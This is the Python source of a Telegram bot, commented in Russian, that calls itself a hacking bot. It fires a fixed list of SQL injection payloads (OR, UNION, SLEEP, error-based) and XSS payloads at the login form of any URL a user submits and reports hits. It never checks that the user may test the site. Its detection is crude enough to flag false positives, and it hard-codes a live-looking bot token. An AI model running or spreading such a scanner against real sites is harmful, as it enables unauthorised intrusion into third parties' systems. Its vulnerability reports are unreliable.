from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import requests
import time
import pickle
import os
from datetime import datetime, date

# База данных для отслеживания запросов
DB_FILE = "user_requests.pkl"

# База данных для отслеживания проверенных сайтов
SITES_DB_FILE = "checked_sites.pkl"

# Админы (замени на свои Telegram ID)
ADMINS = {5370690493}  # Добавь свои ID

# SQL-инъекции (безопасные) с названиями
sql_payloads = {
    "Normal": [
        ("OR-based", "' OR '1'='1"),
        ("OR-based with comment", "' OR '1'='1' --"),
        ("Empty OR", "' OR ''='"),
        ("Simple OR", "1' OR '1")
    ],
    "Advanced": [
        ("UNION Null", "' UNION SELECT NULL, NULL, NULL --"),
        ("UNION Version", "' UNION SELECT 1, version(), database() --"),
        ("Time-based Sleep", "' OR SLEEP(2) --")
    ],
    "Difficult": [
        ("Blind Time-based", "' AND (SELECT * FROM (SELECT SLEEP(2))x) --"),
        ("Table Check", "' AND 1=(SELECT 1 FROM information_schema.tables WHERE table_schema=database() LIMIT 1) --"),
        ("Error-based Version", "' OR 1=CONVERT(int, (SELECT @@version)) --")
    ]
}

# XSS-инъекции (безопасные) с названиями
xss_payloads = {
    "Normal": [
        ("Simple Alert", "<script>alert(1)</script>"),
        ("Image Error", "<img src=x onerror=alert(1)>"),
        ("Mouseover Alert", "test\" onmouseover=\"alert(1)")
    ],
    "Advanced": [
        ("Title Change", "<script>document.title='Test';</script>"),
        ("Input Focus Alert", "<input type='text' onfocus=alert(1)>"),
        ("SVG Load Alert", "<svg onload=alert(1)>")
    ],
    "Difficult": [
        ("Iframe JS", "<iframe src='javascript:alert(1)'>"),
        ("Body Content Change", "<script>document.body.innerHTML='Test';</script>"),
        ("JS Link", "<a href='javascript:alert(1)'>Click</a>")
    ]
}

# Загрузка/сохранение базы данных запросов
def load_requests():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'rb') as f:
            return pickle.load(f)
    return {}

def save_requests(data):
    with open(DB_FILE, 'wb') as f:
        pickle.dump(data, f)

# Загрузка/сохранение базы данных проверенных сайтов
def load_checked_sites():
    if os.path.exists(SITES_DB_FILE):
        with open(SITES_DB_FILE, 'rb') as f:
            return pickle.load(f)
    return {}

def save_checked_sites(data):
    with open(SITES_DB_FILE, 'wb') as f:
        pickle.dump(data, f)

# Проверка лимита запросов
def check_request_limit(user_id):
    if user_id in ADMINS:
        return True
    requests_data = load_requests()
    today = str(date.today())
    user_requests = requests_data.get(user_id, {}).get(today, 0)
    if user_requests >= 10:
        return False
    requests_data.setdefault(user_id, {})[today] = user_requests + 1
    save_requests(requests_data)
    return True

# Отслеживание проверенных сайтов
def track_checked_site(user_id, url):
    sites_data = load_checked_sites()
    sites_data.setdefault(user_id, set()).add(url)
    save_checked_sites(sites_data)

def get_checked_sites_count(user_id):
    sites_data = load_checked_sites()
    return len(sites_data.get(user_id, set()))

# Экранирование специальных символов для MarkdownV2
def escape_markdown(text):
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

# Функция для проверки SQL-инъекций
def check_sql_injection(url, payload):
    try:
        data = {
            "login": payload,
            "password": "test"
        }
        start_time = time.time()
        response = requests.post(url, data=data, timeout=10)
        elapsed_time = time.time() - start_time
        response_text = response.text.lower()

        if "error" not in response_text and response.status_code == 200 and "login" not in response_text:
            return True
        elif "sql" in response_text or "syntax" in response_text or "mysql" in response_text:
            return True
        elif elapsed_time > 2 and "SLEEP" in payload:
            return True
        return False
    except:
        return False

# Функция для проверки XSS
def check_xss(url, payload):
    try:
        data = {
            "login": payload,
            "password": "test"
        }
        response = requests.post(url, data=data, timeout=10)
        response_text = response.text.lower()

        if payload.lower() in response_text or "alert(1)" in response_text or "test" in response_text:
            return True
        return False
    except:
        return False

# Создание клавиатуры для главного меню (без Back)
def get_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("Check", callback_data="check")],
        [InlineKeyboardButton("Profile", callback_data="profile")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Создание клавиатуры для других экранов (с Back)
def get_back_keyboard():
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Создание клавиатуры для результатов (с Menu)
def get_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("Menu", callback_data="menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Команда /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    # Отправка стикера
    await update.message.reply_sticker(sticker="CAACAgIAAxkBAAEOs0hoTjakhCpGSrUYZcB3ipP0QkGJegACBQADwDZPE_lqX5qCa011NgQ")
    
    # Отправка фото с меню (объединены)
    photo_url = "https://i.ibb.co/zVX5tdnP/hacker-5027679-1280.jpg"
    await update.message.reply_photo(
        photo=photo_url,
        caption="*Hey, I'm your hacking bot\\!*",
        parse_mode="MarkdownV2",
        reply_markup=get_main_keyboard()
    )

# Команда /check
async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not check_request_limit(user_id):
        await update.message.reply_text(
            "*Limit reached\\!* Ordinary users can make 10 requests per day\\. Try again tomorrow or contact an admin\\.",
            parse_mode="MarkdownV2",
            reply_markup=get_back_keyboard()
        )
        return
    await update.message.reply_text(
        "🕵️*I'm waiting for you to remove the site\\!*\n"
        "\\[1\\] I'll check the compatibility by type\n"
        "\\| XSS \\- 3 types\n"
        "\\| SQL \\- 3 types",
        parse_mode="MarkdownV2",
        reply_markup=get_back_keyboard()
    )

# Команда /profile
async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    requests_data = load_requests()
    today = str(date.today())
    user_requests = requests_data.get(user_id, {}).get(today, 0)
    status = "Admin (Unlimited)" if user_id in ADMINS else f"User ({10 - user_requests} requests left today)"
    checked_sites = get_checked_sites_count(user_id)
    await update.message.reply_text(
        f"*Your Profile*\n"
        f"_id:_ {escape_markdown(str(user_id))}\n"
        f"_Requests:_ {escape_markdown(status)}\n"
        f"_Checked the sites:_ {escape_markdown(str(checked_sites))}",
        parse_mode="MarkdownV2",
        reply_markup=get_back_keyboard()
    )

# Обработка кнопок
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    message = query.message
    photo_url = "https://i.ibb.co/zVX5tdnP/hacker-5027679-1280.jpg"

    if query.data == "check":
        if not check_request_limit(user_id):
            await message.edit_text(
                "*Limit reached\\!* Ordinary users can make 10 requests per day\\.",
                parse_mode="MarkdownV2",
                reply_markup=get_back_keyboard()
            )
            return
        await message.edit_media(
            InputMediaPhoto(
                photo_url,
                caption="🕵️*I'm waiting for you to remove the site\\!*\n"
                        "\\[1\\] I'll check the compatibility by type\n"
                        "\\| XSS \\- 3 types\n"
                        "\\| SQL \\- 3 types",
                parse_mode="MarkdownV2"
            ),
            reply_markup=get_back_keyboard()
        )
    elif query.data == "profile":
        requests_data = load_requests()
        today = str(date.today())
        user_requests = requests_data.get(user_id, {}).get(today, 0)
        status = "Admin (Unlimited)" if user_id in ADMINS else f"User ({10 - user_requests} requests left today)"
        checked_sites = get_checked_sites_count(user_id)
        await message.edit_media(
            InputMediaPhoto(
                photo_url,
                caption=f"*Your Profile*\n"
                        f"_id:_ {escape_markdown(str(user_id))}\n"
                        f"_Requests:_ {escape_markdown(status)}\n"
                        f"_Checked the sites:_ {escape_markdown(str(checked_sites))}",
                parse_mode="MarkdownV2"
            ),
            reply_markup=get_back_keyboard()
        )
    elif query.data in ["back", "menu"]:
        # Возвращаемся в главное меню с фото
        await message.edit_media(
            InputMediaPhoto(
                photo_url,
                caption="*Hey, I'm your hacking bot\\!*",
                parse_mode="MarkdownV2"
            ),
            reply_markup=get_main_keyboard()
        )

# Обработка URL
async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not check_request_limit(user_id):
        await update.message.reply_text(
            "*Limit reached\\!* Ordinary users can make 10 requests per day\\. Try again tomorrow or contact an admin\\.",
            parse_mode="MarkdownV2",
            reply_markup=get_back_keyboard()
        )
        return

    url = update.message.text.strip()
    if not url.startswith("http"):
        url = "https://" + url

    await update.message.reply_text(
        f"*Checking {escape_markdown(url)} for vulnerabilities\\.\\.\\.*",
        parse_mode="MarkdownV2",
        reply_markup=get_back_keyboard()
    )

    # Отслеживаем проверенный сайт
    track_checked_site(user_id, url)

    # Проверка SQL-инъекций
    sql_results = ""
    for level, payloads in sql_payloads.items():
        for name, payload in payloads:
            if check_sql_injection(url, payload):
                sql_results += f"**> \\[\\!\\] Sql {level} \\- Found \\- {escape_markdown(name)}**\n"

    # Проверка XSS
    xss_results = ""
    for level, payloads in xss_payloads.items():
        for name, payload in payloads:
            if check_xss(url, payload):
                xss_results += f"**> \\[\\!\\] XSS {level} \\- Found \\- {escape_markdown(name)}**\n"

    # Формирование ответа
    response = "**Good luck with your injections\\!**\n\n"
    if sql_results or xss_results:
        response += sql_results + xss_results
    else:
        response += "**> No vulnerabilities found\\.**"

    await update.message.reply_text(
        response,
        parse_mode="MarkdownV2",
        reply_markup=get_menu_keyboard()
    )

# Главная функция
def main():
    # Замени 'YOUR_BOT_TOKEN' на токен от BotFather
    bot_token = '7792427117:AAGaBJPnheKTsjmsvdOPeUoChEE5fVAhEr0'
    application = Application.builder().token(bot_token).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("check", check))
    application.add_handler(CommandHandler("profile", profile))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
    application.add_handler(CallbackQueryHandler(button_handler))

    application.run_polling()

if __name__ == "__main__":
    main()